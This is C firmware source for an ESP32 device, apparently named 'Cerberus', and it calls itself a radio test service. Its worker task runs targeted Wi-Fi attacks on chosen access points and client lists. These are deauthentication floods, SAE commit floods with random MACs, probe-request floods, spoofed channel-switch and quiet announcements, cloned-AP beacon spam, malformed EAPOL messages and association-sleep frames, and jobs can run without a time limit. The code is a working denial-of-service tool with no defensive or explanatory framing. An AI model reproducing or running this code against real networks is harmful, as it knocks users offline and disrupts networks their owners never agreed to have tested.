#include "radio_test_service.h"
#include "raw_wifi_tx.h"
#include "wifi_scanner.h"
#include "wifi_stations.h"
#include "wifi_ap_clone.h"
#include "wifi_sae_commit.h"
#include "sae_commit_material.h"
#include "mbedtls/platform_util.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include <string.h>
static SemaphoreHandle_t mutex;
static cerberus_radio_test_config_t config;
static cerberus_radio_test_status_t status;
static cerberus_wifi_ap_job_t ap_job;
static cerberus_wifi_ap_metadata_t ap_metadata;
/* The 22-byte SPI frame carries at most three clients per chunk. This state is
 * main-task owned under mutex; retries may compare it but never alter a list
 * that an active worker could read. */
static cerberus_wifi_ap_station_begin_t staged_ap_begin;
static cerberus_wifi_ap_station_set_t staged_ap_stations;
static uint32_t staged_ap_received;
static bool staged_ap_valid;
static portMUX_TYPE beacon_lock=portMUX_INITIALIZER_UNLOCKED;
static bool beacon_listening,beacon_ready;
static cerberus_wifi_ap_job_t beacon_target;
static cerberus_wifi_ap_metadata_t beacon_metadata;
static uint8_t beacon_capabilities[2];
static uint32_t received,contact_ms,started_ms;
static bool running,stop,restore_fault;
static uint32_t now_ms(void){return (uint32_t)(esp_timer_get_time()/1000);}
void cerberus_c5_test_receive(const uint8_t *frame,size_t length,uint8_t channel)
{
    portENTER_CRITICAL(&beacon_lock);
    bool active=beacon_listening&&!beacon_ready&&channel==beacon_target.channel;
    cerberus_wifi_ap_job_t target=beacon_target;cerberus_wifi_ap_metadata_t meta=beacon_metadata;
    portEXIT_CRITICAL(&beacon_lock);
    uint8_t capabilities[2];
    if(!active||!cerberus_wifi_ap_beacon_capabilities(&target,meta.ssid,meta.ssid_length,frame,length,capabilities))return;
    portENTER_CRITICAL(&beacon_lock);
    if(beacon_listening&&target.job_id==beacon_target.job_id){memcpy(beacon_capabilities,capabilities,2);beacon_ready=true;}
    portEXIT_CRITICAL(&beacon_lock);
}
static bool cancelled(void)
{
    xSemaphoreTake(mutex,portMAX_DELAY);
    bool value=stop||(uint32_t)(now_ms()-contact_ms)>3000U;
    xSemaphoreGive(mutex);return value;
}
static void publish_tx_progress(uint32_t *pending)
{
    xSemaphoreTake(mutex,portMAX_DELAY);
    uint32_t room=UINT32_MAX-status.accepted_frames;
    status.accepted_frames+=*pending<room?*pending:room;
    uint32_t free_kib=heap_caps_get_free_size(MALLOC_CAP_INTERNAL|MALLOC_CAP_8BIT)/1024U;
    if(free_kib<status.minimum_heap_kib)status.minimum_heap_kib=(uint16_t)free_kib;
    xSemaphoreGive(mutex);
    *pending=0;
}
static void worker(void *unused)
{
    (void)unused;
    xSemaphoreTake(mutex,portMAX_DELAY);cerberus_radio_test_config_t c=config;
    cerberus_wifi_ap_job_t ap=ap_job;cerberus_wifi_ap_metadata_t meta=ap_metadata;
    cerberus_wifi_ap_station_set_t clients=staged_ap_stations;xSemaphoreGive(mutex);
    bool targeted=c.mode==CERBERUS_TEST_WIFI_AP,reverse=false;
    uint8_t frame[160],pristine[160],mac[6],old_channel=0,capabilities[2]={0};
    wifi_second_chan_t old_second=WIFI_SECOND_CHAN_NONE;
    wifi_band_mode_t old_band=WIFI_BAND_MODE_AUTO;
    uint8_t stage=CERBERUS_AP_STAGE_GET_BAND;
    esp_err_t err=esp_wifi_get_band_mode(&old_band);
    if(err==ESP_OK){stage=CERBERUS_AP_STAGE_GET_CHANNEL;err=esp_wifi_get_channel(&old_channel,&old_second);}
    bool restore=err==ESP_OK;
    if(err==ESP_OK){stage=CERBERUS_AP_STAGE_GET_MAC;err=esp_wifi_get_mac(WIFI_IF_STA,mac);}
    if(err==ESP_OK){stage=CERBERUS_AP_STAGE_SET_BAND;err=esp_wifi_set_band_mode(c.channel<=11?WIFI_BAND_MODE_2G_ONLY:WIFI_BAND_MODE_5G_ONLY);}
    if(err==ESP_OK){stage=CERBERUS_AP_STAGE_SET_CHANNEL;err=esp_wifi_set_channel(c.channel,WIFI_SECOND_CHAN_NONE);}
    /* esp_wifi_config_80211_tx_rate() is init-only in ESP-IDF. The scanner
     * already started Wi-Fi, so retain the driver's selected rate here. */
    bool was_cancelled=false,promiscuous=false;
    esp_err_t cleanup=ESP_OK;
    bool announcement=targeted&&(ap.mode==CERBERUS_AP_CHANNEL_SWITCH||ap.mode==CERBERUS_AP_QUIET);
    bool clone=targeted&&ap.mode==CERBERUS_AP_CLONE_SPAM;
    if(err==ESP_OK&&(announcement||clone)&&!cancelled()){
        portENTER_CRITICAL(&beacon_lock);
        beacon_target=ap;beacon_metadata=meta;beacon_ready=false;beacon_listening=true;
        portEXIT_CRITICAL(&beacon_lock);
        wifi_promiscuous_filter_t filter={.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT};
        stage=CERBERUS_AP_STAGE_PROMISC_FILTER;
        err=esp_wifi_set_promiscuous_filter(&filter);
        if(err==ESP_OK){stage=CERBERUS_AP_STAGE_PROMISC_ENABLE;err=esp_wifi_set_promiscuous(true);promiscuous=err==ESP_OK;}
        uint32_t began=now_ms();bool ready=false;
        if(err==ESP_OK)stage=CERBERUS_AP_STAGE_BEACON_WAIT;
        while(err==ESP_OK&&!ready&&!was_cancelled&&(uint32_t)(now_ms()-began)<2000U){
            was_cancelled=cancelled();
            portENTER_CRITICAL(&beacon_lock);ready=beacon_ready;
            if(ready)memcpy(capabilities,beacon_capabilities,2);
            portEXIT_CRITICAL(&beacon_lock);
            if(!ready&&!was_cancelled)vTaskDelay(pdMS_TO_TICKS(10));
        }
        portENTER_CRITICAL(&beacon_lock);beacon_listening=false;portEXIT_CRITICAL(&beacon_lock);
        if(promiscuous){if(err==ESP_OK)stage=CERBERUS_AP_STAGE_PROMISC_DISABLE;
            cleanup=esp_wifi_set_promiscuous(false);promiscuous=false;}
        if(err==ESP_OK&&cleanup!=ESP_OK)err=cleanup;
        if(err==ESP_OK&&!ready&&!was_cancelled){stage=CERBERUS_AP_STAGE_BEACON_WAIT;err=ESP_ERR_TIMEOUT;}
    }
    uint32_t transmit_started=now_ms(),last_progress=transmit_started,frame_index=0;
    uint32_t pending_accepted=0,driver_backoffs=0;uint64_t replay=0;
    while(err==ESP_OK&&!was_cancelled &&
        ((targeted&&!c.seconds)||(uint32_t)(now_ms()-transmit_started)<(uint32_t)c.seconds*1000U)){
        if(cancelled()){was_cancelled=true;break;}
        cerberus_wifi_ap_job_t shot=ap;
        if(targeted&&ap.scope==CERBERUS_AP_STATION_LIST){
            unsigned index=ap.mode==CERBERUS_AP_DEAUTH?(frame_index/2U)%clients.count:frame_index%clients.count;
            shot.scope=CERBERUS_AP_ONE_STATION;memcpy(shot.station,clients.mac[index],6);
        }
        bool probe=targeted&&ap.mode==CERBERUS_AP_PROBE_REQUEST;
        bool sae=targeted&&ap.mode==CERBERUS_AP_SAE_COMMIT;
        if(probe){esp_fill_random(mac,sizeof(mac));mac[0]=(mac[0]&0xfc)|2;if(!memcmp(mac,ap.bssid,6))mac[5]^=1;}
        uint8_t scalar[32]={0},element[64]={0};
        if(sae){
            stage=CERBERUS_AP_STAGE_SAE_MATERIAL;
            err=cerberus_c5_sae_material_generate(scalar,element);
            if(err!=ESP_OK){mbedtls_platform_zeroize(scalar,sizeof(scalar));mbedtls_platform_zeroize(element,sizeof(element));break;}
            if(cancelled()){
                was_cancelled=true;
                mbedtls_platform_zeroize(scalar,sizeof(scalar));mbedtls_platform_zeroize(element,sizeof(element));break;
            }
            esp_fill_random(mac,sizeof(mac));mac[0]=(mac[0]&0xfc)|2;
            if(!memcmp(mac,ap.bssid,6))mac[5]^=1;
        }
        stage=CERBERUS_AP_STAGE_BUILD_FRAME;
        size_t length=sae?cerberus_wifi_sae_commit_frame(&shot,mac,scalar,element,NULL,0,frame,sizeof(frame)):
            probe?cerberus_wifi_ap_probe(&shot,mac,meta.ssid,meta.ssid_length,frame,sizeof(frame)):
            targeted?cerberus_wifi_ap_frame(&shot,reverse,frame,sizeof(frame)):
            cerberus_radio_test_beacon(&c,mac,(uint64_t)esp_timer_get_time(),frame,sizeof(frame));
        if(targeted&&ap.mode==CERBERUS_AP_BAD_MESSAGE){
            uint8_t nonce[32];esp_fill_random(nonce,sizeof(nonce));
            length=cerberus_wifi_ap_bad_message(&shot,meta.short_eapol,++replay,nonce,frame,sizeof(frame));
        }else if(announcement){
            static const uint8_t channels[]={1,2,3,4,5,6,7,8,9,10,11,36,40,44,48,149,153,157,161,165};
            uint8_t random=0;esp_fill_random(&random,1);unsigned i=random%sizeof(channels);
            if(channels[i]==ap.channel)i=(i+1)%sizeof(channels);
            length=cerberus_wifi_ap_announcement(&ap,meta.ssid,meta.ssid_length,capabilities,channels[i],
                (uint64_t)esp_timer_get_time(),frame,sizeof(frame));
        }else if(clone){
            uint8_t random=0;esp_fill_random(&random,1);
            uint8_t padded=(uint8_t)(meta.ssid_length+random%(33U-meta.ssid_length));
            length=cerberus_wifi_ap_clone_beacon(&ap,ap.station,meta.ssid,meta.ssid_length,
                capabilities,padded,(uint64_t)esp_timer_get_time(),frame,sizeof(frame));
        }
        bool association=targeted&&ap.mode==CERBERUS_AP_ASSOC_SLEEP;
        if(length)memcpy(pristine,frame,length);
        if(length||association)stage=CERBERUS_AP_STAGE_TRANSMIT;
        /* Retry only documented queue-pressure results. The same fully built
         * frame is restored before each retry; replay/identity never change. */
        for(unsigned attempt=0;;++attempt){
            if(attempt){
                if(cancelled()){was_cancelled=true;err=ESP_OK;break;}
                if(length)memcpy(frame,pristine,length);
            }
            if(sae)err=!length?ESP_ERR_INVALID_SIZE:cerberus_c5_raw_sae_commit(&shot,frame,length);
            else if(association)err=cerberus_c5_raw_association(&shot,meta.ssid,meta.ssid_length);
            else err=!length?ESP_ERR_INVALID_SIZE:targeted&&ap.mode==CERBERUS_AP_DEAUTH?cerberus_c5_raw_deauth(frame,length):
                esp_wifi_80211_tx(WIFI_IF_STA,frame,(int)length,true);
            if((err!=ESP_ERR_NO_MEM&&err!=ESP_ERR_WIFI_WOULD_BLOCK)||attempt==4U)break;
            if(driver_backoffs<UINT32_MAX)++driver_backoffs;
            if(cancelled()){was_cancelled=true;err=ESP_OK;break;}
            vTaskDelay(1U<<attempt);
        }
        if(sae){
            mbedtls_platform_zeroize(scalar,sizeof(scalar));
            mbedtls_platform_zeroize(element,sizeof(element));
            if(length){mbedtls_platform_zeroize(frame,length);mbedtls_platform_zeroize(pristine,length);}
        }
        if(was_cancelled)break;
        if(targeted&&ap.mode==CERBERUS_AP_DEAUTH&&shot.scope==CERBERUS_AP_ONE_STATION)reverse=!reverse;
        ++frame_index;
        if(err==ESP_OK)++pending_accepted;
        uint32_t progress_now=now_ms();
        if(pending_accepted>=64U||(uint32_t)(progress_now-last_progress)>=100U){
            publish_tx_progress(&pending_accepted);last_progress=progress_now;
        }
        if(targeted){
            if(err==ESP_OK&&(frame_index&63U)==0U)vTaskDelay(1);
        }else for(unsigned i=0;i<10U&&err==ESP_OK;++i){
            if(cancelled()){was_cancelled=true;break;}vTaskDelay(pdMS_TO_TICKS(10));
        }
        if(was_cancelled)break;
    }
    publish_tx_progress(&pending_accepted);
    uint8_t failure_stage=err==ESP_OK?CERBERUS_AP_STAGE_NONE:stage;
    if(restore){
        if(err==ESP_OK)stage=CERBERUS_AP_STAGE_RESTORE_BAND;
        esp_err_t restore_err=esp_wifi_set_band_mode(old_channel<=14?WIFI_BAND_MODE_2G_ONLY:WIFI_BAND_MODE_5G_ONLY);
        if(restore_err==ESP_OK){if(err==ESP_OK)stage=CERBERUS_AP_STAGE_RESTORE_CHANNEL;
            restore_err=esp_wifi_set_channel(old_channel,old_second);}
        if(err==ESP_OK&&restore_err==ESP_OK)stage=CERBERUS_AP_STAGE_RESTORE_MODE;
        esp_err_t band_err=esp_wifi_set_band_mode(old_band);
        if(cleanup==ESP_OK)cleanup=restore_err!=ESP_OK?restore_err:band_err;
        if(err==ESP_OK)err=cleanup;
    }
    xSemaphoreTake(mutex,portMAX_DELAY);
    status.state=err!=ESP_OK?CERBERUS_TEST_ERROR:was_cancelled?CERBERUS_TEST_CANCELLED:CERBERUS_TEST_COMPLETE;
    status.error_code=err;status.name_length=targeted&&err!=ESP_OK?
        (failure_stage!=CERBERUS_AP_STAGE_NONE?failure_stage:stage):0;
    status.elapsed_ms=now_ms()-started_ms;running=false;restore_fault=cleanup!=ESP_OK;
    uint32_t accepted=status.accepted_frames,elapsed=status.elapsed_ms;
    xSemaphoreGive(mutex);
    if(targeted)ESP_LOGI("ap_job","job=%u mode=%u accepted=%lu elapsed_ms=%lu queue_backoffs=%lu error=%ld",
        ap.job_id,ap.mode,(unsigned long)accepted,(unsigned long)elapsed,
        (unsigned long)driver_backoffs,(long)err);
    vTaskDelete(NULL);
}
esp_err_t cerberus_c5_test_init(void){mutex=xSemaphoreCreateMutex();return mutex?ESP_OK:ESP_ERR_NO_MEM;}
bool cerberus_c5_test_running(void)
{if(!mutex)return false;xSemaphoreTake(mutex,portMAX_DELAY);bool value=running||restore_fault;xSemaphoreGive(mutex);return value;}
esp_err_t cerberus_c5_test_begin(const cerberus_radio_test_begin_t *r)
{
    if(!mutex||!r||!r->job_id||r->mode!=CERBERUS_TEST_WIFI_BEACON||!r->name_length||r->name_length>32)return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(status.job_id==r->job_id){
        bool same=config.mode==r->mode&&config.channel==r->channel&&config.seconds==r->seconds&&config.name_length==r->name_length&&!memcmp(config.name,r->name,16);
        xSemaphoreGive(mutex);return same?ESP_OK:ESP_ERR_INVALID_ARG;
    }
    if(running||restore_fault){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    memset(&config,0,sizeof(config));config.job_id=r->job_id;config.mode=r->mode;config.channel=r->channel;config.seconds=r->seconds;config.name_length=r->name_length;
    memcpy(config.name,r->name,16);unsigned first=r->name_length<16?r->name_length:16;received=(1UL<<first)-1U;
    status=(cerberus_radio_test_status_t){.job_id=r->job_id,.state=CERBERUS_TEST_STAGED,.mode=r->mode,.channel=r->channel,.seconds=r->seconds,.name_length=r->name_length,.counts_valid=1};
    xSemaphoreGive(mutex);return ESP_OK;
}
esp_err_t cerberus_c5_test_chunk(const cerberus_radio_test_chunk_t *r)
{
    if(!mutex||!r||!r->length||r->length>16||r->offset>31||r->offset+r->length>32)return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(status.state!=CERBERUS_TEST_STAGED||r->job_id!=config.job_id||r->offset+r->length>config.name_length){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    memcpy(config.name+r->offset,r->data,r->length);
    for(unsigned i=0;i<r->length;++i)received|=1UL<<(r->offset+i);
    xSemaphoreGive(mutex);return ESP_OK;
}
esp_err_t cerberus_c5_test_start(uint16_t id,bool radio_busy)
{
    if(!mutex||!id)return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(status.job_id!=id){xSemaphoreGive(mutex);return ESP_ERR_NOT_FOUND;}
    if(status.state!=CERBERUS_TEST_STAGED){xSemaphoreGive(mutex);return ESP_OK;}
    uint32_t expected=config.name_length==32?UINT32_MAX:(1UL<<config.name_length)-1U;
    if(radio_busy||running||restore_fault||received!=expected||!cerberus_radio_test_config_valid(&config)){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    if(heap_caps_get_free_size(MALLOC_CAP_INTERNAL|MALLOC_CAP_8BIT)<24576U){xSemaphoreGive(mutex);return ESP_ERR_NO_MEM;}
    running=true;stop=false;contact_ms=started_ms=now_ms();status.state=CERBERUS_TEST_RUNNING;
    status.minimum_heap_kib=(uint16_t)(heap_caps_get_free_size(MALLOC_CAP_INTERNAL|MALLOC_CAP_8BIT)/1024U);
    if(xTaskCreate(worker,"wifi_beacon_test",4096,NULL,3,NULL)!=pdPASS){running=false;status.state=CERBERUS_TEST_ERROR;status.error_code=ESP_ERR_NO_MEM;}
    esp_err_t err=status.error_code;xSemaphoreGive(mutex);return err;
}
/* A begin reserves a complete AP identity and client count, but no radio state.
 * Exact retries leave both the coverage bitmap and active worker untouched. */
esp_err_t cerberus_c5_ap_stage_begin(const cerberus_wifi_ap_station_begin_t *r,bool radio_busy)
{
    if(!mutex||!r||r->job.scope!=CERBERUS_AP_STATION_LIST||
       !cerberus_wifi_ap_job_valid(&r->job)||r->count<2||r->count>CERBERUS_WIFI_STATION_LIMIT)
        return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(staged_ap_valid&&staged_ap_begin.job.job_id==r->job.job_id){
        bool same=!memcmp(&staged_ap_begin,r,sizeof(*r));
        xSemaphoreGive(mutex);return same?ESP_OK:ESP_ERR_INVALID_ARG;
    }
    if(status.job_id==r->job.job_id){xSemaphoreGive(mutex);return ESP_ERR_INVALID_ARG;}
    if(running||restore_fault||radio_busy){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    staged_ap_begin=*r;
    memset(&staged_ap_stations,0,sizeof(staged_ap_stations));
    staged_ap_stations.count=r->count;staged_ap_received=0;staged_ap_valid=true;
    xSemaphoreGive(mutex);return ESP_OK;
}
static bool staged_station_mac_valid(const uint8_t mac[6])
{return !(mac[0]&1)&&(mac[0]|mac[1]|mac[2]|mac[3]|mac[4]|mac[5]);}
esp_err_t cerberus_c5_ap_stage_chunk(const cerberus_wifi_ap_station_chunk_t *r)
{
    if(!mutex||!r||!r->job_id||!r->count||r->count>3||
       r->offset>=CERBERUS_WIFI_STATION_LIMIT||r->offset+r->count>CERBERUS_WIFI_STATION_LIMIT)
        return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(!staged_ap_valid||r->job_id!=staged_ap_begin.job.job_id||
       r->offset+r->count>staged_ap_begin.count){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    /* Validate the entire chunk first so a malformed retry never leaves half
     * a received chunk in the staged set. */
    for(unsigned i=0;i<r->count;++i){
        unsigned index=r->offset+i;
        const uint8_t *mac=r->mac[i];
        if(!staged_station_mac_valid(mac)||!memcmp(mac,staged_ap_begin.job.bssid,6)){
            xSemaphoreGive(mutex);return ESP_ERR_INVALID_ARG;
        }
        if(staged_ap_received&(UINT32_C(1)<<index)){
            if(memcmp(mac,staged_ap_stations.mac[index],6)){
                xSemaphoreGive(mutex);return ESP_ERR_INVALID_ARG;
            }
        }else if(running){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
        for(unsigned j=0;j<staged_ap_begin.count;++j){
            if(j!=index&&(staged_ap_received&(UINT32_C(1)<<j))&&
               !memcmp(mac,staged_ap_stations.mac[j],6)){
                xSemaphoreGive(mutex);return ESP_ERR_INVALID_ARG;
            }
        }
        for(unsigned j=0;j<i;++j)if(!memcmp(mac,r->mac[j],6)){
            xSemaphoreGive(mutex);return ESP_ERR_INVALID_ARG;
        }
    }
    for(unsigned i=0;i<r->count;++i){
        unsigned index=r->offset+i;
        if(!(staged_ap_received&(UINT32_C(1)<<index))){
            memcpy(staged_ap_stations.mac[index],r->mac[i],6);
            staged_ap_received|=UINT32_C(1)<<index;
        }
    }
    xSemaphoreGive(mutex);return ESP_OK;
}
esp_err_t cerberus_c5_ap_start(const cerberus_wifi_ap_job_t *r,bool radio_busy)
{
    if(!mutex||!cerberus_wifi_ap_job_valid(r))return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(status.job_id==r->job_id){
        bool same=config.mode==CERBERUS_TEST_WIFI_AP&&!memcmp(&ap_job,r,sizeof(*r));
        if(same&&r->scope==CERBERUS_AP_STATION_LIST)
            same=staged_ap_valid&&!memcmp(&staged_ap_begin.job,r,sizeof(*r));
        xSemaphoreGive(mutex);return same?ESP_OK:ESP_ERR_INVALID_ARG;
    }
    if(running||restore_fault||radio_busy){xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;}
    if(r->scope==CERBERUS_AP_STATION_LIST){
        uint32_t expected=staged_ap_stations.count==32?UINT32_MAX:
            (UINT32_C(1)<<staged_ap_stations.count)-1U;
        if(!staged_ap_valid||memcmp(&staged_ap_begin.job,r,sizeof(*r))||
           staged_ap_stations.count!=staged_ap_begin.count||
           staged_ap_received!=expected||!cerberus_wifi_ap_station_set_valid(r,&staged_ap_stations)){
            xSemaphoreGive(mutex);return ESP_ERR_INVALID_STATE;
        }
    }
    cerberus_wifi_ap_metadata_t metadata={0};
    esp_err_t error=cerberus_wifi_ap_target_metadata(r,&metadata);
    if(error==ESP_OK&&r->scope==CERBERUS_AP_STATION_LIST){
        cerberus_wifi_ap_job_t one=*r;
        one.scope=CERBERUS_AP_ONE_STATION;
        for(unsigned i=0;i<staged_ap_stations.count;++i){
            memcpy(one.station,staged_ap_stations.mac[i],6);
            error=cerberus_wifi_ap_target_valid(&one);
            if(error!=ESP_OK)break;
        }
    }
    size_t minimum_free=r->mode==CERBERUS_AP_SAE_COMMIT?32768U:24576U;
    if(error==ESP_OK&&heap_caps_get_free_size(MALLOC_CAP_INTERNAL|MALLOC_CAP_8BIT)<minimum_free)error=ESP_ERR_NO_MEM;
    if(error!=ESP_OK){xSemaphoreGive(mutex);return error;}
    ap_job=*r;ap_metadata=metadata;config=(cerberus_radio_test_config_t){.job_id=r->job_id,.mode=CERBERUS_TEST_WIFI_AP,.channel=r->channel,.seconds=r->seconds};
    status=(cerberus_radio_test_status_t){.job_id=r->job_id,.state=CERBERUS_TEST_RUNNING,
        .mode=CERBERUS_TEST_WIFI_AP,.channel=r->channel,.seconds=r->seconds,.counts_valid=1,
        .minimum_heap_kib=(uint16_t)(heap_caps_get_free_size(MALLOC_CAP_INTERNAL|MALLOC_CAP_8BIT)/1024U)};
    running=true;stop=false;contact_ms=started_ms=now_ms();
    unsigned worker_stack=r->mode==CERBERUS_AP_SAE_COMMIT?8192U:4096U;
    if(xTaskCreate(worker,"wifi_ap_job",worker_stack,NULL,3,NULL)!=pdPASS){running=false;status.state=CERBERUS_TEST_ERROR;status.error_code=ESP_ERR_NO_MEM;}
    error=status.error_code;xSemaphoreGive(mutex);return error;
}
esp_err_t cerberus_c5_test_stop(uint16_t id)
{
    if(!mutex||!id)return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(mutex,portMAX_DELAY);
    if(status.job_id!=id){xSemaphoreGive(mutex);return ESP_ERR_NOT_FOUND;}
    stop=true;if(running)status.state=CERBERUS_TEST_STOPPING;else if(status.state==CERBERUS_TEST_STAGED)status.state=CERBERUS_TEST_CANCELLED;
    xSemaphoreGive(mutex);return ESP_OK;
}
void cerberus_c5_test_status(uint16_t id,cerberus_radio_test_status_t *out)
{
    if(!out)return;
    memset(out,0,sizeof(*out));
    if(!mutex){out->state=CERBERUS_TEST_ERROR;out->error_code=ESP_ERR_INVALID_STATE;return;}
    xSemaphoreTake(mutex,portMAX_DELAY);if(id&&id==status.job_id)contact_ms=now_ms();*out=status;
    if(running)out->elapsed_ms=now_ms()-started_ms;
    xSemaphoreGive(mutex);
}
